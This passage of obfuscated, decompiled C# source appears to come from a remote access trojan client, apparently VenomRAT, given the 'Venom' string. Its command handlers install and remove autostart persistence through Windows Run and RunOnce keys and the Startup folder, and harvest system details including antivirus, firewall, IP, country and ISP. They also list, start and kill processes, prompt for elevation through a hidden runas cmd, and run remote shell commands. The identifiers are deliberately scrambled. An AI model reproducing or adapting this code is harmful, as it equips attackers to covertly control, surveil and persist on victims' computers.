          if (\u2125举\u003Cȋ푡흇钹봳\uF05B\uE37A聉髦踾ל\uF471\uFFFDꂊ\u255D\uA63E됈.\uEE5CԱ\uE1C7᪅㜲뙔㭗嘋聆ሟ㾄嘱쎖ǃㄨᾥꮟ骤ᚸ奊(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name, command.Path, true))
            break;
          throw new Exception("Could not add value");
        case 4:
          if (!ఌ\u0B72Ŧ횀\u02D3쀋쌅ِ\u02D9䀘䩕䵭곳ꨕ黝刎䊦谩藰陕.Is64Bit)
            throw new NotSupportedException("Only on 64-bit systems supported");
          if (\u2125举\u003Cȋ푡흇钹봳\uF05B\uE37A聉髦踾ל\uF471\uFFFDꂊ\u255D\uA63E됈.\uEE5CԱ\uE1C7᪅㜲뙔㭗嘋聆ሟ㾄嘱쎖ǃㄨᾥꮟ骤ᚸ奊(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name, command.Path, true))
            break;
          throw new Exception("Could not add value");
        case 5:
          if (!ఌ\u0B72Ŧ횀\u02D3쀋쌅ِ\u02D9䀘䩕䵭곳ꨕ黝刎䊦谩藰陕.Is64Bit)
            throw new NotSupportedException("Only on 64-bit systems supported");
          if (\u2125举\u003Cȋ푡흇钹봳\uF05B\uE37A聉髦踾ל\uF471\uFFFDꂊ\u255D\uA63E됈.\uEE5CԱ\uE1C7᪅㜲뙔㭗嘋聆ሟ㾄嘱쎖ǃㄨᾥꮟ骤ᚸ奊(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name, command.Path, true))
            break;
          throw new Exception("Could not add value");
        case 6:
          if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup)))
            Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Startup));
          using (StreamWriter streamWriter = new StreamWriter(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), command.Name + ".url"), false))
          {
            streamWriter.WriteLine("[InternetShortcut]");
            streamWriter.WriteLine("URL=file:///" + command.Path);
            streamWriter.WriteLine("IconIndex=0");
            streamWriter.WriteLine("IconFile=" + command.Path.Replace('\\', '/'));
            streamWriter.Flush();
            break;
          }
      }
    }
    catch (Exception ex)
    {
      new SetStatus(string.Format("Adding Autostart Item failed: {0}", (object) ex.Message)).Execute(client);
    }
  }

  public static void 뤕㷃\u0A29篈\uFFFD들Ѹ\uE5A4מּ䆁䠓᥌킾붛\u2A97榑䶊讁ꎪ\uFFFD(
    DoStartupItemRemove command,
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ client)
  {
    try
    {
      switch (command.Type)
      {
        case 0:
          if (\u2125举\u003Cȋ푡흇钹봳\uF05B\uE37A聉髦踾ל\uF471\uFFFDꂊ\u255D\uA63E됈.䡹\u20C2쉖図䄧\u2627榸\u294Bㅔ忿\uE256\uE64Ehᩪꡐ姷\u0B11컽\u25C2\uA4CE(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name))
            break;
          throw new Exception("Could not remove value");
        case 1:
          if (\u2125举\u003Cȋ푡흇钹봳\uF05B\uE37A聉髦踾ל\uF471\uFFFDꂊ\u255D\uA63E됈.䡹\u20C2쉖図䄧\u2627榸\u294Bㅔ忿\uE256\uE64Ehᩪꡐ姷\u0B11컽\u25C2\uA4CE(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name))
            break;
          throw new Exception("Could not remove value");
        case 2:
          if (\u2125举\u003Cȋ푡흇钹봳\uF05B\uE37A聉髦踾ל\uF471\uFFFDꂊ\u255D\uA63E됈.䡹\u20C2쉖図䄧\u2627榸\u294Bㅔ忿\uE256\uE64Ehᩪꡐ姷\u0B11컽\u25C2\uA4CE(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name))
            break;
          throw new Exception("Could not remove value");
        case 3:
          if (\u2125举\u003Cȋ푡흇钹봳\uF05B\uE37A聉髦踾ל\uF471\uFFFDꂊ\u255D\uA63E됈.䡹\u20C2쉖図䄧\u2627榸\u294Bㅔ忿\uE256\uE64Ehᩪꡐ姷\u0B11컽\u25C2\uA4CE(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name))
            break;
          throw new Exception("Could not remove value");
        case 4:
          if (!ఌ\u0B72Ŧ횀\u02D3쀋쌅ِ\u02D9䀘䩕䵭곳ꨕ黝刎䊦谩藰陕.Is64Bit)
            throw new NotSupportedException("Only on 64-bit systems supported");
          if (\u2125举\u003Cȋ푡흇钹봳\uF05B\uE37A聉髦踾ל\uF471\uFFFDꂊ\u255D\uA63E됈.䡹\u20C2쉖図䄧\u2627榸\u294Bㅔ忿\uE256\uE64Ehᩪꡐ姷\u0B11컽\u25C2\uA4CE(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name))
            break;
          throw new Exception("Could not remove value");
        case 5:
          if (!ఌ\u0B72Ŧ횀\u02D3쀋쌅ِ\u02D9䀘䩕䵭곳ꨕ黝刎䊦谩藰陕.Is64Bit)
            throw new NotSupportedException("Only on 64-bit systems supported");
          if (\u2125举\u003Cȋ푡흇钹봳\uF05B\uE37A聉髦踾ל\uF471\uFFFDꂊ\u255D\uA63E됈.䡹\u20C2쉖図䄧\u2627榸\u294Bㅔ忿\uE256\uE64Ehᩪꡐ姷\u0B11컽\u25C2\uA4CE(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name))
            break;
          throw new Exception("Could not remove value");
        case 6:
          string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), command.Name);
          if (!System.IO.File.Exists(path))
            throw new IOException("File does not exist");
          System.IO.File.Delete(path);
          break;
      }
    }
    catch (Exception ex)
    {
      new SetStatus(string.Format("Removing Autostart Item failed: {0}", (object) ex.Message)).Execute(client);
    }
  }

  public static void 蟺\uF62B쓽ﰚ၅郃\u22AA賢縧먝乌䔎\uEAC1걯碙岿륔ᅩɵ㶉(
    GetSystemInfo command,
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ client)
  {
    try
    {
      IPGlobalProperties globalProperties = IPGlobalProperties.GetIPGlobalProperties();
      string str1 = !string.IsNullOrEmpty(globalProperties.DomainName) ? globalProperties.DomainName : "-";
      string str2 = !string.IsNullOrEmpty(globalProperties.HostName) ? globalProperties.HostName : "-";
      new GetSystemInfoResponse(new string[36]
      {
        "Processor (CPU)",
        \uE4DC熒\uE6EF\uE0EA㚘㼃鯚ꎷ\uE866４콟꩕ꎃ颐\uF62Dㅓ蘫ꌮ\u0EE8\uFFFD.瘎酙ᛆ㭛耶悎涢吷䧟蹆\uECD6ᅀ㲏\uF01A\uF70D䎈謑䰕㯾㧔(),
        "Memory (RAM)",
        string.Format("{0} MB", (object) \uE4DC熒\uE6EF\uE0EA㚘㼃鯚ꎷ\uE866４콟꩕ꎃ颐\uF62Dㅓ蘫ꌮ\u0EE8\uFFFD.灭\uFFFD\uEB93ᷝ\u2008\u2F48쉿ᘢ\u23F7텩딷謗敲꼓弁\uF829ᮛ䲍㑉\uEAE7()),
        "Video Card (GPU)",
        \uE4DC熒\uE6EF\uE0EA㚘㼃鯚ꎷ\uE866４콟꩕ꎃ颐\uF62Dㅓ蘫ꌮ\u0EE8\uFFFD.躣뾊젣\uFFFD鑫뉉\u2797ꬢ퇁\uE70A猃懝퐨\uFFFD龏䪘ﺦ叓䔫乑(),
        "Username",
        \u2731믻靖ᧅ衉\u2AA6쫘詖땒\uF433ᣬ飩\u2052蹗\u09F7밹쯦띠颉ᝳ.柰篋鏵稴㱕뻔\u1B4C\u2343\u2909嫕\uED3C욙ꔾ㟬㛜鮥曈ᗻ黹篨(),
        "PC Name",
        틒\uFFFD\u324C踩퓆뵷͆ᆄ㐛꼈\uE588\u08DD孃ᖈ\uF623덬렦蜾\u21C5鹩.앦懻㯺몑逿翗礓脯핗ㆀ梲酟ꈡ侬ꓨ᳧良እﲧ떬(),
        "Domain Name",
        str1,
        "Host Name",
        str2,
        "System Drive",
        Path.GetPathRoot(Environment.SystemDirectory),
        "System Directory",
        Environment.SystemDirectory,
        "Uptime",
        틒\uFFFD\u324C踩퓆뵷͆ᆄ㐛꼈\uE588\u08DD孃ᖈ\uF623덬렦蜾\u21C5鹩.\uFFFD䠕ꜯｻ鼽\u0F11덗滢贾䣿䚯嵊緐ꋫ\uFFFD刭㐗隗\uA9C9ꪀ(),
        "MAC Address",
        \uE4DC熒\uE6EF\uE0EA㚘㼃鯚ꎷ\uE866４콟꩕ꎃ颐\uF62Dㅓ蘫ꌮ\u0EE8\uFFFD.\uFFFD\uF87D穈䥓ᕱ竱\u2F0E䕏궷봞祥\uE07C\u24A6\u1AC0즬๋艴\u3244\u25A4㞡(),
        "LAN IP Address",
        \uE4DC熒\uE6EF\uE0EA㚘㼃鯚ꎷ\uE866４콟꩕ꎃ颐\uF62Dㅓ蘫ꌮ\u0EE8\uFFFD.\uF15B\uFFFD宙哔皽宰\uED72\uFFFD㣰徶쥈ˣ\uE341論壉㟢\u002C崟꿌荞(),
        "WAN IP Address",
        䏢蛭\uEFEE窚쟖叱때淄뚃\uE54D톜줺땱쯵莮䀉깃ᰫ\uF4CF喝.GeoInfo.Ip,
        "Antivirus",
        틒\uFFFD\u324C踩퓆뵷͆ᆄ㐛꼈\uE588\u08DD孃ᖈ\uF623덬렦蜾\u21C5鹩.ඌ\uF194\uFFFDᮻꕔ뎦뜢䤒ﮠ珴ḑ測ᔾ끮鄍ᛧ뚗焢\uFFFD\u2F73(),
        "Firewall",
        틒\uFFFD\u324C踩퓆뵷͆ᆄ㐛꼈\uE588\u08DD孃ᖈ\uF623덬렦蜾\u21C5鹩.敏\uFFFD픺귏\uEFD3\u2A1F\uFB0D蓆ᕛ둻\uF310\uE55C읍䡝\uE72E\uF472㖤훙吟ﰽ(),
        "Time Zone",
        䏢蛭\uEFEE窚쟖叱때淄뚃\uE54D톜줺땱쯵莮䀉깃ᰫ\uF4CF喝.GeoInfo.Timezone,
        "Country",
        䏢蛭\uEFEE窚쟖叱때淄뚃\uE54D톜줺땱쯵莮䀉깃ᰫ\uF4CF喝.GeoInfo.Country,
        "ISP",
        䏢蛭\uEFEE窚쟖叱때淄뚃\uE54D톜줺땱쯵莮䀉깃ᰫ\uF4CF喝.GeoInfo.Isp
      }).Execute(client);
    }
    catch
    {
    }
  }

  public static void \u0ED4觀錭쳸䉽\u0F02厇փ館鍉㻇䄡餌埦ꤗ쫑澭ᇱ谗茊(
    GetVncInfo command,
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ client)
  {
    try
    {
      IPGlobalProperties globalProperties = IPGlobalProperties.GetIPGlobalProperties();
      if (!string.IsNullOrEmpty(globalProperties.DomainName))
      {
        string domainName = globalProperties.DomainName;
      }
      if (!string.IsNullOrEmpty(globalProperties.HostName))
      {
        string hostName = globalProperties.HostName;
      }
      new GetVncInfoResponse(new string[2]
      {
        "Login",
        \uE4DC熒\uE6EF\uE0EA㚘㼃鯚ꎷ\uE866４콟꩕ꎃ颐\uF62Dㅓ蘫ꌮ\u0EE8\uFFFD.룊灣卋붡ѹ븛囘숰灬쏋\u2B29\uF24B䂧䞑\u2803鷔碓\uF473\uFFFD\uEFAA()
      }).Execute(client);
    }
    catch
    {
    }
  }

  public static void ᄨ庒䂝ꌕी欑鸆\uFFFD긹䵮\u233E\uFFFD羻披踓\uFFFDꫭ쯞䯠戰(
    GetRdpInfo command,
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ client)
  {
    try
    {
      IPGlobalProperties globalProperties = IPGlobalProperties.GetIPGlobalProperties();
      if (!string.IsNullOrEmpty(globalProperties.DomainName))
      {
        string domainName = globalProperties.DomainName;
      }
      if (!string.IsNullOrEmpty(globalProperties.HostName))
      {
        string hostName = globalProperties.HostName;
      }
      new GetVncInfoResponse(new string[2]
      {
        "Login",
        \uE4DC熒\uE6EF\uE0EA㚘㼃鯚ꎷ\uE866４콟꩕ꎃ颐\uF62Dㅓ蘫ꌮ\u0EE8\uFFFD.䳵\uFFFD\uE71B蟼闷\u26C9ঊ嬷ⰴ\u09F4ᗳ귎\uE3BC塏䄒ᓐ\u0BDF넣ꀏᖝ()
      }).Execute(client);
    }
    catch
    {
    }
  }

  public static void 궎\uE50C땲늫䗐㧘\u273D\uF35A串띠\uF5E1\uEBB0\u27CC퉈衺럎荵磨㤺\u0A58(
    GetProcesses command,
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ client)
  {
    Process[] processes1 = Process.GetProcesses();
    string[] processes2 = new string[processes1.Length];
    int[] ids = new int[processes1.Length];
    string[] titles = new string[processes1.Length];
    int index = 0;
    foreach (Process process in processes1)
    {
      processes2[index] = process.ProcessName + ".exe";
      ids[index] = process.Id;
      titles[index] = process.MainWindowTitle;
      ++index;
    }
    new GetProcessesResponse(processes2, ids, titles).Execute(client);
  }

  public static void \uFF17优\uE415릎賘\uE612黅凱\u137F냧䱊攴懶봯\uF010ᬈ\uE029\uE709션胉(
    DoProcessStart command,
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ client)
  {
    if (string.IsNullOrEmpty(command.Processname))
    {
      new SetStatus("Process could not be started!").Execute(client);
    }
    else
    {
      try
      {
        Process.Start(new ProcessStartInfo()
        {
          UseShellExecute = true,
          FileName = command.Processname
        });
      }
      catch
      {
        new SetStatus("Process could not be started!").Execute(client);
      }
      finally
      {
        \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.궎\uE50C땲늫䗐㧘\u273D\uF35A串띠\uF5E1\uEBB0\u27CC퉈衺럎荵磨㤺\u0A58(new GetProcesses(), client);
      }
    }
  }

  public static void 拁虵媊黫텰㫑帬貎煢煱叵䁵\u3011쩌ꘖ廌螠ႋ뺇\uFFFD(
    DoProcessKill command,
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ client)
  {
    try
    {
      Process.GetProcessById(command.PID).Kill();
    }
    catch
    {
    }
    finally
    {
      \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.궎\uE50C땲늫䗐㧘\u273D\uF35A串띠\uF5E1\uEBB0\u27CC퉈衺럎荵磨㤺\u0A58(new GetProcesses(), client);
    }
  }

  public static void 蓮\uEA15劬铬퉐㥙ꕪ뵟ﳩ㙾ፕ\u27A2㕪\uF8B5潠哕\uF396컹\u29C1\uEEF0(
    DoAskElevate command,
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ client)
  {
    if (\u2731믻靖ᧅ衉\u2AA6쫘詖땒\uF433ᣬ飩\u2052蹗\u09F7밹쯦띠颉ᝳ.ᜄի뎮ȱ\uE3E7錦烊裛荪炑\uF6B6痌\u21E4嬢闄Ꮬ\u0D5E\u0017\uE779䚽() != "Admin")
    {
      ProcessStartInfo startInfo = new ProcessStartInfo()
      {
        FileName = "cmd",
        Verb = "runas",
        Arguments = "/k START \"\" \"" + 熋劬\uE3BE렺蓮\uE89B窑陼\u204B䵜膡闸洠\u2E40䙭\uE8F7낒껨鹗䯼.CurrentPath + "\" & EXIT",
        WindowStyle = ProcessWindowStyle.Hidden,
        UseShellExecute = true
      };
      禍ꖅ\uE6FB㢯邊ూ\u33DE㞓豖㪚\uF1E8ύ輌䍊ꦹ衿\u2E0C\uFFFD릳젹.玮澘춞덙駴郦貚\uF848Ộ㨌菷ꍤ\u2354Ⰳ佪ॹ炋\uF8F3쫠芜();
      try
      {
        Process.Start(startInfo);
      }
      catch
      {
        new SetStatus("User refused the elevation request.").Execute(client);
        禍ꖅ\uE6FB㢯邊ూ\u33DE㞓豖㪚\uF1E8ύ輌䍊ꦹ衿\u2E0C\uFFFD릳젹.凖艣窶䞍锖\u0A5D亵ᅕ껍崲\u07F8ꐧ㑾䛐쁯繒\uF430뒂뤪ꗩ(윒莫莹䨿㰊辊穌栃㰄幇ᵨ纊W航འ샧㒴軕䬂ජ.猧刚祑꿖恫횋㹷\uFB1B୪욗ⳆŬ\u0FF3냥꾩浊蒀Ķ㚟嘋);
        return;
      }
      \uEDA3ᾖ\u19EEᜡ崞谑総栊烘詠լ鶍\uE425踡䪵청\u28BFⷨ먯喕.\u20CF죊䍡鯦눇빔术A\u07BE깯챌\u26D3龮Ḍ\uE1CB媠\uF2CB풜鳙嚐.\u3235貳筄쐆﹍㢗쭦ὂ퐫ᙥ쒐颢䣴ӄ떲\uE6D1\u3398\uEB28\uE9AD딂();
    }
    else
      new SetStatus("Process already elevated.").Execute(client);
  }

  public static void 䣺璔쌟뚊ཷἔ\u2F14\u26AF嗢ἲዐ릕䘙鰣暣\uFFFD嵫\uF668鹖溄(
    DoRemoveRdp command,
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ client)
  {
    픭廴얖ヰᆘ藰\uF5B6\u1FEE査\uE9DA꣯Ẑ츲汱砄버曆縞ᢒ팿.푗礅囇䮋粉ฃ\u271E䥺䵚\uEE22̚ﮦ菷\u2666\uF1D1\uF6D9\uE471ꩯ쉑懤();
    픭廴얖ヰᆘ藰\uF5B6\u1FEE査\uE9DA꣯Ẑ츲汱砄버曆縞ᢒ팿.䖲զ춨栍倀儒얝\uE8C9ښ웹㐋\uE795끮幋\u288D曔蛼㗯\uE74Cꝑ();
    픭廴얖ヰᆘ藰\uF5B6\u1FEE査\uE9DA꣯Ẑ츲汱砄버曆縞ᢒ팿.웮\u27F5蕰姆֣\uEAD2\u3268屛년ᚗ\uF418ၧ멊硣\uF871\u1AFF\u2AEB縳\uE541鷷();
    쇋燌猵뾅袧֫䋐쪂僀匳᠙ꀵ\u321C\uF2A2\uF06D欩\uE10C鍡쇥煕.\uFFFD擈接吧찻ꭳ䙁\u2AF8붿쑞鉙眑쟖夶墯쐯蝔\uEA6B㑜猢();
    쇋燌猵뾅袧֫䋐쪂僀匳᠙ꀵ\u321C\uF2A2\uF06D欩\uE10C鍡쇥煕.닐\u2A2E玙匵톁緹\uFFFD奞\u2FB4霉睮ꯛṠᆎꠓ䜭Ӊ쉚광ꇺ("Venom");
    픭廴얖ヰᆘ藰\uF5B6\u1FEE査\uE9DA꣯Ẑ츲汱砄버曆縞ᢒ팿.\uA8BE\uFFFD\uE6A9\u24F0ᖧ䥛慅\u0382俳篑塑ⶌ賯\uEC8D\u02F8鱼䂿봎Ḿʈ();
    픭廴얖ヰᆘ藰\uF5B6\u1FEE査\uE9DA꣯Ẑ츲汱砄버曆縞ᢒ팿.푗礅囇䮋粉ฃ\u271E䥺䵚\uEE22̚ﮦ菷\u2666\uF1D1\uF6D9\uE471ꩯ쉑懤();
  }

  public static void 궡恿珮뉵㰛켇糌\u2671䣌\u25CB袝ऱ萼썺裼㵻植ੰ\u1FB5ؾ(
    DoRemoveVnc command,
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ client)
  {
    픭廴얖ヰᆘ藰\uF5B6\u1FEE査\uE9DA꣯Ẑ츲汱砄버曆縞ᢒ팿.푗礅囇䮋粉ฃ\u271E䥺䵚\uEE22̚ﮦ菷\u2666\uF1D1\uF6D9\uE471ꩯ쉑懤();
    픭廴얖ヰᆘ藰\uF5B6\u1FEE査\uE9DA꣯Ẑ츲汱砄버曆縞ᢒ팿.䖲զ춨栍倀儒얝\uE8C9ښ웹㐋\uE795끮幋\u288D曔蛼㗯\uE74Cꝑ();
    픭廴얖ヰᆘ藰\uF5B6\u1FEE査\uE9DA꣯Ẑ츲汱砄버曆縞ᢒ팿.䌋㩨葇ꨶ퀛祸粎욣警ɐ彳몤ꡏ騃섡쐲쓫鳊䆘\uEC12();
    픭廴얖ヰᆘ藰\uF5B6\u1FEE査\uE9DA꣯Ẑ츲汱砄버曆縞ᢒ팿.\uA8BE\uFFFD\uE6A9\u24F0ᖧ䥛慅\u0382俳篑塑ⶌ賯\uEC8D\u02F8鱼䂿봎Ḿʈ();
    픭廴얖ヰᆘ藰\uF5B6\u1FEE査\uE9DA꣯Ẑ츲汱砄버曆縞ᢒ팿.푗礅囇䮋粉ฃ\u271E䥺䵚\uEE22̚ﮦ菷\u2666\uF1D1\uF6D9\uE471ꩯ쉑懤();
  }

  public static void \uFFFD猾书枇芛썘ㅕ뢲쒫\uE981鱧ꩂ᮸성㙬炉䇕폙պ\uE76C(
    DoShellExecute command,
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ client)
  {
    string command1 = command.Command;
    if (\uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.\uF679칾\uE7DE\u2E87濱邥\u3319\u2F21珫찐큅嬗ѩ爷\uFFFD썈矗쿨ਔ똿 == null && command1 == "exit")
      return;
    if (\uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.\uF679칾\uE7DE\u2E87濱邥\u3319\u2F21珫찐큅嬗ѩ爷\uFFFD썈矗쿨ਔ똿 == null)
      \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.\uF679칾\uE7DE\u2E87濱邥\u3319\u2F21珫찐큅嬗ѩ爷\uFFFD썈矗쿨ਔ똿 = new Shell();
    if (command1 == "exit")
      \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.숒\uFFFD\u1CCF缅챒ꝋﴣ\uF6FA䧞\uFFFD셥\uF58Fⷢ㾔\uEDC9馲硁㓳왩\u28C0();
    else
      \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.\uF679칾\uE7DE\u2E87濱邥\u3319\u2F21珫찐큅嬗ѩ爷\uFFFD썈矗쿨ਔ똿.ExecuteCommand(command1);
  }

  public static void 숒\uFFFD\u1CCF缅챒ꝋﴣ\uF6FA䧞\uFFFD셥\uF58Fⷢ㾔\uEDC9馲硁㓳왩\u28C0()
  {
    if (\uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.\uF679칾\uE7DE\u2E87濱邥\u3319\u2F21珫찐큅嬗ѩ爷\uFFFD썈矗쿨ਔ똿 == null)
      return;
    \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.\uF679칾\uE7DE\u2E87濱邥\u3319\u2F21珫찐큅嬗ѩ爷\uFFFD썈矗쿨ਔ똿.Dispose();
  }

  public struct 좢쀧㱽栕\uE564뗆偍뿷泊㨱탳匸䡲ؚȐ셤虋䶱\uE83E판
  {
    public uint Ẁ蘌厬㻀\uFFFD鯆\u332D邹팝\uF79B\u3013冤㭃쵈倎䄒官薸ᶵ쏗;
    public uint ꏳ場\u26ACඃ䆞縢\uE506㔜뽉肀撦뱲㚼陉ᘽ盩㟠\uFFFDⳒ뺶;
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
    public byte[] 䥮\uF046ᬺ쀁晿烪\uEFFC\u0B77绶쟲媗ἁ䝈棲厙镒ﴑ\uFFFD叾霰;
    public uint \uFE33১Ç霗쫇\uFFFD\uF51A锐㟑䴇맇뾘स抒譊ꤾ뱹捭\uFFFD铜;
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
    public byte[] 컌据ꇣ갷럷\uE423ﱢ\uEB70티\uFFFD\uF323燄굆갨魺顔ቺ뛡抪跻;
    public uint ʥ땏\uEBA5㚵ꮀ\uE7C3\u25A4繭\uEA80쥶\u28BB鬼첇㔉驊ﭘ总钄\uF40Eඑ;

    public IPAddress LocalAddress => new IPAddress((long) this.ꏳ場\u26ACඃ䆞縢\uE506㔜뽉肀撦뱲㚼陉ᘽ盩㟠\uFFFDⳒ뺶);

    public ushort LocalPort => BitConverter.ToUInt16(new byte[2]
    {
      this.䥮\uF046ᬺ쀁晿烪\uEFFC\u0B77绶쟲媗ἁ䝈棲厙镒ﴑ\uFFFD叾霰[1],
      this.䥮\uF046ᬺ쀁晿烪\uEFFC\u0B77绶쟲媗ἁ䝈棲厙镒ﴑ\uFFFD叾霰[0]
    }, 0);

    public IPAddress RemoteAddress => new IPAddress((long) this.\uFE33১Ç霗쫇\uFFFD\uF51A锐㟑䴇맇뾘स抒譊ꤾ뱹捭\uFFFD铜);

    public ushort RemotePort => BitConverter.ToUInt16(new byte[2]
    {
      this.컌据ꇣ갷럷\uE423ﱢ\uEB70티\uFFFD\uF323燄굆갨魺顔ቺ뛡抪跻[1],
      this.컌据ꇣ갷럷\uE423ﱢ\uEB70티\uFFFD\uF323燄굆갨魺顔ቺ뛡抪跻[0]
    }, 0);
  }

  public struct 㬟\uE22B埘뫭e伎\uF099\uF46B䐒㽍厺灚掄庪೯溿䌀뚴闪\uFFFD
  {
    public uint 㲿ꅱ\u2B29娄唗惼ꧭ讼９깍అꉯ떅侤頂\uE9A3\uFFFD牶\u2080慌;
    private readonly \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.좢쀧㱽栕\uE564뗆偍뿷泊㨱탳匸䡲ؚȐ셤虋䶱\uE83E판 浪铽뮠톄툆퉡弖\uF186\uF09D醱䮑ᣨ히\uE753廘\uF044㼤ﱩ곈\uF31E;
  }

  private enum \uE809ℙ櫄艚Ⱘ嫄ᱦ䘼\u2F5E恢ءꃐȯ\uFFFD븨辬뭆脆鳎莳
  {
    拔礔\u3307幙솢㥲䊱雕㻹伱d\uE4C1꽒鑈䞞\uE9A3ㅛ\u25C0ᅇ\uEE90,
    \uE3A9殗ꅐḊ㓞愙煨襠\u270A\uFFFD闠㾼\u0B74\uE7AE\u20E0ʤ搠䝼\uF4E9뒋,
    仹劒\uE6C3ᴤ\u3239\uF606ꡘ凖\u19F0詠鰎諞\uE9DD䡺綶禰ꗧࢱ瞧隋,
    \uF289\uF68E䐆轠씜埩졼έ瑰赹頙冿锫鈠꼡\uFFFD᤺\u2598蒜駊,
    錊峬㚋衠爧箙㔟硩ᄌ晆ﶃ졀娢勲䅲\uFFFDㅚ俬뼣뜞,
    \uFFFD팈뾄\u228F㝛撮叽齠\u22A2鞕ꬱ賳क繁\uEE5C檵\u2E2A\uEAF2뚬\uE2B2,
    \uEDCD잿\uFFFD鶿៉ꤨ諶䳓肇ꝲ씖Ⴆ媭斌閧\u2A0B㬚䂈\uECC1\uE9B5,
    숵\uE01F퍂ᇄ\uE4C3먝뇰ฆ巣鰇\u2632遱є\uFFFD䧛慎\uF8EA嗀꾩敏,
    \uE00B보\uE5F7\u1AAA鴮㰇䆘鰸믒\uE5D3픛銳蚊㦀몟褌퀷覆泛퓨,
  }
}
